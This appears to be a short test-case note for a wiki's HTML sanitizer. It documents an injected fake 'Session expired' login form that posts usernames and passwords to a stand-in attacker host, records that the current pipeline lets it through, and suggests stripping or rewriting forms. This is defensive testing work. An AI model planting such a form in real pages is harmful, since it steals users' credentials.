# Form injection / credential phishing

A form posting to an attacker origin, styled to look like a legitimate login
prompt embedded in the trusted wiki.

<form action="//evil.example/collect" method="POST">
  <h3>Session expired - please sign in again</h3>
  <label>Username <input type="text" name="username"></label>
  <label>Password <input type="password" name="password"></label>
  <button type="submit">Log in</button>
</form>

Expected (current pipeline): the form survives and submits credentials to the
attacker. Because it lives on the trusted output domain, it is convincing.
Future guard: drop `<form>`/`<input>`/`<button>` (or rewrite form actions to a
neutral target) during sanitization.
